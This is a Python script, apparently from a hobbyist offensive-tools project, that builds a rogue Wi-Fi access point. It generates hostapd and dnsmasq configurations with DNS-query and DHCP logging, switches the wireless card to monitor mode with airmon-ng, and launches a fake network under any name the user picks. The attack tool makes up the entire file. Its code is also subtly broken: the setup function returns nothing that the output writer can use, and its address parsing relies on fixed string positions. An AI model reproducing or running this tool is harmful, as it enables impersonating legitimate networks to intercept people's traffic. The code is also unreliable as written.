# Author: o-o
# Date: 3/23/2019
# Description: A modified command-line parser.

import argparse

# Parse the command.
# Precondition: None.
# Postcondition: Start module.

def parse():

    try:

        # Create Object && Format.
        parser = argparse.ArgumentParser(add_help=False)

        # Group && Add Arguments.
        group1 = parser.add_argument_group("options")
        group2 = parser.add_argument_group("additional")
        group1.add_argument("-e","--essid",metavar="",help=": Insert a network name.")
        group1.add_argument("-c","--channel",metavar="",help=": Insert a channel.")
        group1.add_argument("-o","--output",metavar="",help=": Dump to output file.")
        group2.add_argument("-h","--help",action="help",default=argparse.SUPPRESS,help=": Display the usage screen.")

        # Join & Create Arguments.
        args = parser.parse_args()

        # If Correct Command.
        if args.essid and args.channel and args.output:

            # Processing Data.
            data = metadata(args.essid,args.channel)

            # Output File.
            writer(args.output,data)

        else:
            parser.print_help()

    except Exception as e:
        print(str(e))

# ===================================================================

# Author: o-o
# Date: 3/23/2019
# Description: Rouge AP.

import os
import linux

# Create Rouge AP.
# Precondition: Two Strings.
# Postcondition: Create Rouge AP.

def metadata(essid,channel):

  # MONITOR MODE && GATEWAY =========================================

  # Open Tab.
  linux.TIME = 1
  linux.tab()

  # Gets Required Data.
  # Precondition: Two Strings && An Int.
  # Postcondition: Returns Data.

  def get_info(name,command,key):

    # Execute Command.
    linux.command(command)
  
    # Read && Store Data.
    with open(name,"r") as raw_data:
      
      # Options.
      if key == 1:
        data = [device.strip() for device in raw_data]
      elif key == 2:
        data = [gateway.strip().split(" ") for gateway in raw_data]

      # Delete File.
      raw_data.close()
      os.remove(name)

      # Return Data.
      return data

  # Get Required Data.
  data1 = get_info("Interface.txt","basename -a /sys/class/net/* >> Interface.txt",1)
  data2 = get_info("Gateway.txt","route -n >> Gateway.txt",2)

  # Close Tab.
  linux.end()

  # CREATE AP =========================================================

  if len(data1) >= 3:

    # Local Variables.
    interface = data1[-1]
    gateway = data2[2][9]
    subgate = gateway[:11]

    # ROUTER CONFIGURATION.
    with open("hostapd.conf","w") as ap:

      ap.write("interface=%smon" % (interface))
      ap.write("\ndriver=nl80211")
      ap.write("\nssid=%s" % (essid))
      ap.write("\nhw_mode=g")
      ap.write("\nchannel=%s" % (channel))
      ap.write("\nmacaddr_acl=0")
      ap.write("\nignore_broadcast_ssid=0")
      ap.close()

    # DNS CONFIGURATION.
    with open("dnsmasq.conf","w") as dns:

      dns.write("interface=%smon" % (interface))
      dns.write("\ndhcp-range=%s.2,%s.30,255.255.255.0,12h" % (subgate,subgate))
      dns.write("\ndhcp-option=3,%s" % (gateway))
      dns.write("\ndhcp-option=6,%s" % (gateway))
      dns.write("\nserver=8.8.8.8")
      dns.write("\nlog-queries")
      dns.write("\nlog-dhcp")
      dns.write("\nlisten-address=127.0.0.1")
      dns.close()

    # Open Tab.
    linux.tab()

    # Start Monitor Mode.
    linux.TIME = 5
    linux.command("airmon-ng start %s" % (interface))    

    # Gateway | Netmask | Routing Tables
    linux.TIME = 1        
    linux.command("ifconfig %smon up %s netmask 255.255.255.0" % (interface,gateway))
    linux.command("route add -net %s.0 netmask 255.255.255.0 gw %s" % (subgate,gateway))

    # Close Tab.
    linux.end()

    # EXECUTE =======================================================

    # Start AP.
    linux.tab()
    linux.command("hostapd hostapd.conf")

    # Start DNS Server.
    linux.tab()
    linux.command("dnsmasq -C dnsmasq.conf -d")

# ===================================================================

# Author: o-o
# Date: 3/23/2019
# Description: A file writer.

# Write the data to a file.
# Precondition: Tuple && Multi-dimensional List.
# Postcondition: Write the data to a file.

def writer(name,data):

    # Create the file.
    with open(name, "w") as profile:

        # Write the data to the file.
        for key, value in data:
            profile.write("%s,%s\n" % (key,value))

    # Close the file.
    profile.close()

# Execute the program.
if __name__ == "__main__":
    parse()
